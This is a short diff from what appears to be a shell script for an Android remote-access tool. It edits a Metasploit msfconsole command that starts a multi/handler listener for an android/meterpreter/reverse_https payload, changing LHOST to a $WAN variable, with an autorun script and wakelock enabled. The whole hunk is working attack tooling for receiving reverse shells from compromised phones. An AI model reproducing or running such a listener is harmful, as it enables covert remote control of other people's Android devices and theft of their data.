@@ -373,7 +373,7 @@ EOF
 
 
     msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https; \
-                    set LHOST $NoIP;set LPORT 443;set ReverseListenerBindAddress $LAN; \
+                    set LHOST $WAN;set LPORT 443;set ReverseListenerBindAddress $LAN; \
                     set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"
 }
 
